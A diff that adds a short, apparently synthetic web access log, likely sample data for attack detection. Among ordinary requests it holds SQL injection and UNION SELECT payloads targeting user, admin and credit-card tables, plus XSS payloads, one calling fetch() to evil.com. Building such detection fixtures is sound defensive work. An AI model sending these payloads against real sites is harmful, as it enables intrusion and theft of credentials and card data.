@@ -1,0 +1,11 @@
+192.168.1.10 - GET /index.html - 200
+192.168.1.15 - POST /login - 200
+45.12.33.9 - GET /admin/login.php?id=' OR '1'='1 - 500
+127.0.0.1 - GET /about.html - 200
+10.0.0.5 - GET /products.php?cat=1 UNION SELECT null, null, username, password FROM users - 200
+192.168.1.50 - GET /search?q=<script>alert('hack')</script> - 400
+192.168.1.22 - GET /contact.php - 200
+185.22.11.4 - POST /api/v1/data - SELECT * FROM credit_cards - 500
+192.168.1.99 - GET /index.php?id=1 UNION SELECT username, password FROM admin
+192.168.1.20 - GET /contact.html - 200
+10.0.0.99 - GET /index.php?q=<script>fetch('[http://evil.com](http://evil.com)')</script>
